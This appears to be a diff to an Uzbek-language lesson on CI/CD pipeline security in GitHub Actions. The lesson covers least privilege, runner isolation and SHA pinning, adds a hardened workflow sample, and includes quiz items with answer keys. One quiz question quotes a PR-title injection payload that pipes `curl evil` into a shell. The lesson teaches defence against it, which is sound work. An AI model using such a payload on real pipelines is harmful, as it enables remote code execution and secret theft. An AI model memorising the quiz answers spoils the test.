@@ -12,17 +12,17 @@ sources:
   - id: t10-a03
     note: "A03:2025: CI/CD pipeline qurilayotgan tizimdan zaifroq bo'lsa xavf; vazifalarni ajratish (separation of duty); environment-scoped secrets, signed builds, tamper-evident logs"
   - id: slsa
-    note: "SLSA draft: Build L3 da build'lar bir-biriga ta'sir qila olmasligi va imzolash maxfiy materiali build qadamlariga ochiq bo'lmasligi talab qilinadi"
+    note: "SLSA v1.1 Build L3 (Hardened builds): build'lar bir-biriga ta'sir qila olmasligi va imzolash maxfiy materiali foydalanuvchi build qadamlariga ochiq bo'lmasligi; self-hosted runner izolyatsiyasi g'oyasiga mos"
   - id: cs-secrets
     note: "OWASP Secrets Management Cheat Sheet 3-bo'lim: CI vositasidagi sirlar, OIDC federation, qisqa muddatli credential'lar, runtime sirlarini pipeline'dan o'tkazmaslik"
 quiz:
   - q: "Workflow `run: echo \"title=${{ github.event.pull_request.title }}\"` qatoriga ega. PR sarlavhasi `x\"; curl evil | sh; echo \"` bo'lsa nima bo'ladi?"
     options:
-      - "Hech narsa: GitHub ifodani avtomatik qochiradi (escape)"
       - "Sarlavha skript matniga qo'yiladi, shell uni buyruq sifatida o'qiydi va qo'shimcha buyruq bajariladi"
+      - "Hech narsa: GitHub ifodani avtomatik qochiradi (escape)"
       - "Workflow ishga tushmaydi, chunki sarlavhada qo'shtirnoq bor"
       - "Faqat sarlavha logda ko'rinmaydi"
-    answer: 1
+    answer: 0
     explain: "Ifoda skript yaratilishidan oldin matn sifatida o'rniga qo'yiladi, shuning uchun qo'shtirnoq va nuqta-vergul shell sintaksisiga aylanadi. Tuzatish: qiymatni env orqali berish, skript matni esa o'zgarmas qoladi."
   - q: "`pull_request_target` bilan ishga tushadigan workflow `actions/checkout` ga PR'ning head SHA'sini beradi va keyin `npm test` ishga tushiradi. Asosiy xavf qaysi?"
     options:
@@ -35,10 +35,10 @@ quiz:
   - q: "Jamoa action'larni `@v4` tegi bilan chaqiradi. Nima uchun to'liq commit SHA'ga qotirish kuchliroq?"
     options:
       - "SHA qisqaroq yoziladi"
-      - "Teg ko'chirilishi yoki o'chirilishi mumkin, commit SHA esa o'zgarmas obyektni bildiradi"
       - "SHA action'ni tezroq yuklaydi"
       - "Teg ishlamaydi, faqat SHA ishlaydi"
-    answer: 1
+      - "Teg ko'chirilishi yoki o'chirilishi mumkin, commit SHA esa o'zgarmas obyektni bildiradi"
+    answer: 3
     explain: "Repoga kirish olgan hujumchi tegni zararli commit'ga ko'chira oladi. SHA'ni soxtalashtirish SHA-1 kolliziyasini talab qiladi. Qotirish yangilanishni qo'lda boshqarishni talab qiladi: trade-off."
   - q: "CI uchun uzoq muddatli bulut access key'i repository secret sifatida saqlanadi. Qaysi variant xavfni eng ko'p kamaytiradi?"
     options:
@@ -168,7 +168,7 @@ OWASP CI/CD cheat sheet pipeline risklarini o'nta toifaga ajratadi (CICD-SEC-1 d
 2. Pipeline nimaga ishonadi? Bu bog'liqliklar va uchinchi tomon action/plug-in'lari: ular pipeline ichida sizning huquqingiz bilan ishlaydi.
 3. Pipeline qanday huquqlarga ega? Bu IAM, sirlar va token: minimal huquq, qisqa muddat, ajratilgan scope.
 
-Cheat sheet least privilege'ni uchta joyga qo'llashni aytadi: pipeline qadamlari tashqi resurslarga kirish uchun ishlatadigan sirlar, bir pipeline yoki qadamning CI platformadagi boshqa resurslarga kirishi, va pipeline ishlaydigan node'lar. Qoida "ruxsat asoslangan bo'lishi kerak, taxmin qilinmasligi kerak", ya'ni deny by default.
+Cheat sheet least privilege'ni uchta joyga qo'llashni aytadi: pipeline qadamlari tashqi resurslarga kirish uchun ishlatadigan sirlar, bir pipeline yoki qadamning CI platformadagi boshqa resurslarga kirishi, va pipeline ishlaydigan node'lar. Qoida: ruxsat aniq berilishi kerak, ehtimolga qoldirilmasligi kerak, ya'ni deny by default.
 
 ## Chuqurroq: GitHub Actions'dagi aniq mexanizmlar
 
@@ -194,7 +194,7 @@ Secrets Management cheat sheet qo'shadi: pipeline'ni statik bulut kalitidan voz 
 
 ### Runner'lar
 
-GitHub-hosted runner'lar efemer, izolyatsiyalangan VM'larda ishlaydi. Self-hosted runner'lar bunday kafolatga ega emas va ishonchsiz kod ularni doimiy buzishi mumkin, shuning uchun hujjat ularni public repozitoriylar uchun deyarli hech qachon ishlatmaslikni tavsiya qiladi: har kim PR ochib muhitni buzishi mumkin. Runner mashinasidagi sirlar (SSH kalitlari, API token'lar) va sezgir xizmatlarga tarmoq kirishi (masalan, bulut metadata xizmati) minimal bo'lishi kerak. Har job'dan keyin runner'ni yo'q qilish yetarli emas: hujjatga ko'ra bir runner faqat bitta job bajarishiga kafolat yo'q va ba'zi job'lar sirlarni buyruq qatori argumenti sifatida ishlatadi, ularni `ps` orqali boshqa job ko'rishi mumkin; just-in-time runner'lar bu uchun alohida bo'lim. SLSA draftining Build L3 talabi shu g'oya bilan mos: build'lar bir-biriga ta'sir qilmasligi (hatto bitta loyiha ichida) va imzolash maxfiy materiali foydalanuvchi build qadamlariga ochiq bo'lmasligi.
+GitHub-hosted runner'lar efemer, izolyatsiyalangan VM'larda ishlaydi. Self-hosted runner'lar bunday kafolatga ega emas va ishonchsiz kod ularni doimiy buzishi mumkin, shuning uchun hujjat ularni public repozitoriylar uchun deyarli hech qachon ishlatmaslikni tavsiya qiladi: har kim PR ochib muhitni buzishi mumkin. Runner mashinasidagi sirlar (SSH kalitlari, API token'lar) va sezgir xizmatlarga tarmoq kirishi (masalan, bulut metadata xizmati) minimal bo'lishi kerak. Har job'dan keyin runner'ni yo'q qilish yetarli emas: hujjatga ko'ra bir runner faqat bitta job bajarishiga kafolat yo'q va ba'zi job'lar sirlarni buyruq qatori argumenti sifatida ishlatadi, ularni `ps` orqali boshqa job ko'rishi mumkin; just-in-time runner'lar bu uchun alohida bo'lim. SLSA v1.1 Build L3 talabi shu g'oya bilan mos: build'lar bir-biriga ta'sir qilmasligi (hatto bitta loyiha ichida) va imzolash maxfiy materiali foydalanuvchi build qadamlariga ochiq bo'lmasligi.
 
 ## Misol: PR sarlavhasi orqali buyruq bajarish
 
@@ -324,6 +324,49 @@ console.log("jami:", found.length);
 satr 8: actions/checkout@v4 commit SHA bilan qotirilmagan
 jami: 1
 ```
+
+### Mustahkamlangan workflow
+
+Yuqoridagi mexanizmlar bitta workflow faylida shunday yig'iladi. Bu ishga tushirilmaydigan YAML namuna: `<40 belgili SHA>` o'rniga tanlagan action'ingizning haqiqiy commit SHA'sini qo'yasiz, `<cloud-login-action>` esa bulut provayderingizning OIDC login action'i.
+
+```yaml
+name: build-and-deploy
+on:
+  pull_request:          # pull_request_target emas: fork kodi imtiyozsiz ishlaydi
+  push:
+    branches: [main]
+
+permissions:
+  contents: read         # GITHUB_TOKEN default: faqat o'qish
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<40 belgili SHA>      # tegni ham izoh sifatida yozing: v4
+      - uses: actions/setup-node@<40 belgili SHA>
+        with:
+          node-version: 22
+      - run: npm ci --ignore-scripts                 # lockfile majburiy (81-dars)
+      - name: PR sarlavhasini xavfsiz o'qish
+        env:
+          TITLE: ${{ github.event.pull_request.title }}   # ifoda env ga, skript matniga emas
+        run: echo "title=$TITLE"
+      - run: npm test
+
+  deploy:
+    if: github.ref == 'refs/heads/main'
+    needs: test
+    runs-on: ubuntu-latest
+    environment: production                          # required reviewers shu environment'da
+    permissions:
+      contents: read
+      id-token: write                                # faqat OIDC token so'rash uchun
+    steps:
+      - uses: <cloud-login-action>@<40 belgili SHA>  # statik kalit o'rniga qisqa muddatli credential
+```
+
+Har qator bitta xavfga javob beradi. `pull_request` trigger'i fork kodini sirsiz ishga tushiradi. Workflow darajasidagi `permissions` token'ni faqat o'qishga tushiradi, `id-token: write` esa faqat deploy job'ida beriladi; GitHub hujjatiga ko'ra bu huquq faqat OIDC token olishga ruxsat beradi, boshqa resurslarga yozuv huquqini bermaydi. `environment` required reviewer bilan deploy job'ining environment sirlariga tasdiqsiz kirishini yopadi. Qoldiq risk: SHA bilan qotirilgan action'ning o'z kodi hali ham sizning job'ingizda bajariladi (audit kerak), va `npm test` ishonchsiz PR kodini ishga tushiradi: shuning uchun bu job'da sir yo'q.
 
 ## Qachon qo'llamaslik kerak
 
